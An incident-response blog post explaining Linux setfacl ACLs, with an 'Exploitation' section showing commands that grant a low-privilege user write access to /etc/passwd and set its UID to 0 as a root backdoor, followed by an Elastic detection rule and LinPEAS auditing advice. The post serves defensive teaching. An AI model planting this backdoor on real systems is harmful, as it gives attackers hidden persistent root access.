---
title: Today I Learned - setfacl
url: https://dfir.ch/posts/today_i_learned_setfacl/
source: Over Security - Cybersecurity news aggregator
date: 2024-12-18
fetch_date: 2025-10-06T19:44:15.636619
---

# Today I Learned - setfacl

[Home](https://dfir.ch/)
[ ]

Menu

* [Home](/)
* [Posts](/posts/)
* [Talks](/talks/)
* [Tweets](/tweets/)
* |

LIGHT

DARK

# Today I Learned - setfacl

17 Dec 2024

**Table of Contents**

* [Introduction](#introduction)
* [Exploitation](#exploitation)
* [Detection](#detection)
* [Conclusion](#conclusion)

## Introduction

`setfacl` is a command-line utility in Linux/Unix systems used to set `Access Control Lists` (ACLs) on files and directories. ACLs provide a more flexible permission mechanism than the traditional owner-group-other model. They allow for the assignment of specific permissions to individual users or groups beyond what the basic file system permissions support.

```
setfacl [options] [permissions] file/directory
```

**Options:**

* **-m**: Modify or add an ACL entry.
* **-x**: Remove an ACL entry.
* **-b**: Remove all ACL entries.
* **-k**: Remove the default ACL.
* **-R**: Apply recursively to directories.

**Permissions:**

Let’s do a short test in our lab. First, the `root` user creates a new text file, `file.txt`. Only `root` can write to this file:

```
root@dfir:/tmp# ls -l file.txt
-rw-r--r-- 1 root root 0 Dec 15 13:39 file.txt
```

Checking the ACL permissions with `getfacl`, again, only `root` has write access to this file:

```
root@dfir:/tmp# getfacl file.txt
# file: file.txt
# owner: root
# group: root
user::rw-
group::r--
other::r--
```

The general format for setting a new ACL with `setfacl` is `u:<user>:<permissions>` or `g:<group>:<permissions>`. For example:

```
setfacl -m u:malmoeb:rw file.txt
```

This command gives the user `malmoeb` read and write permissions on `file.txt`. `ls -l` will now show a `+` at the end of the permissions to indicate there are extended ACLs:

```
malmoeb@dfir:/tmp$ ls -l file.txt
-rw-rw-r--+ 1 root root 8 Dec 15 13:41 file.txt
```

And `getfacl` adds another line with the permissions for `malmoeb`:

```
malmoeb@dfir:/tmp$ getfacl file.txt
# file: file.txt
# owner: root
# group: root
user::rw-
user:malmoeb:rw-
group::r--
mask::rw-
other::r--
```

The user `malmoeb`, although not the owner of this file, nor in a group that has write permissions over this file, can write to `file.txt`:

```
malmoeb@dfir:/tmp$ echo "dfir.ch" > file.txt
malmoeb@dfir:/tmp$ cat file.txt
dfir.ch
```

**Even if a fileâs traditional chmod permissions are restrictive, ACLs can override them and grant access to additional users.**

## Exploitation

You probably see where we’re heading to. However, `setfacl` is not installed out-of-the-box on a freshly installed Ubuntu box:

```
root@dfir:~# setfacl -m u:malmoeb:rwx file.txt
Command 'setfacl' not found, but can be installed with:
apt install acl
```

An attack that gained root on a Linux box (at least on newer Ubuntu hosts) would have to first install the package `acl` or bring the binaries from another source to the compromised server. Probably (at least from my point of view) the easiest escalation path (or backdoor) is to change the permissions of the `/etc/passwd` file, in order for our low-priv user to write to.

```
root@dfir:/tmp# setfacl -m u:malmoeb:rw /etc/passwd
```

We are giving our `malmoeb` user now write rights over the `/etc/passwd` file, and setting our UID to zero:

```
root@dfir:/tmp# tail /etc/passwd
[..]
malmoeb:x:0:0:,,,:/home/malmoeb:/bin/bash
```

VoilÃ  - we are root:

```
root@dfir:/tmp# su malmoeb
root@dfir:/tmp# id
uid=0(root) gid=0(root) groups=0(root),100(users)
```

## Detection

Elastic has a [detection](https://www.elastic.co/guide/en/security/current/access-control-list-modification-via-setfacl.html) for the (ab-)use of the setfacl command:

```
process where host.os.type == "linux" and event.type == "start" and
event.action in ("exec", "exec_event", "executed", "process_started") and
process.name == "setfacl" and not (
  process.command_line == "/bin/setfacl --restore=-" or
  process.args == "/var/log/journal/"
)
```

Run the [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/6a98d4698779a863d7dba3aa7f30260bcb45e263/linPEAS) script (LinPEAS is a script that searches for possible paths to escalate privileges on Linux/Unix\*/MacOS hosts) regularly on your Linux servers, and check the output carefully. Get rid of as many low-hanging fruits as you can. Below is the relevant snippet from the LinPEAS script:

![getfacl linpeas check](/images/setfacl/getfacl.png "getfacl linpeas check")

Figure 1: LinPEAS getfacl check

## Conclusion

`setfacl` is a powerful tool for managing `Access Control Lists` (ACLs) on Linux/Unix systems, offering flexibility beyond traditional file permissions. By allowing granular control over file and directory access, it opens possibilities for both legitimate use and exploitation.

To mitigate risks, defenders should regularly audit their systems using tools like `LinPEAS`, monitor for unusual activity involving `setfacl`, and minimize the presence of unnecessary tools like the acl package on sensitive systems.

Here is another excellent article about [how to manage ACLs on Linux](https://linuxconfig.org/how-to-manage-acls-on-linux).

Â© 2025 .
Powered by [Hugo blog awesome](https://github.com/hugo-sid/hugo-blog-awesome).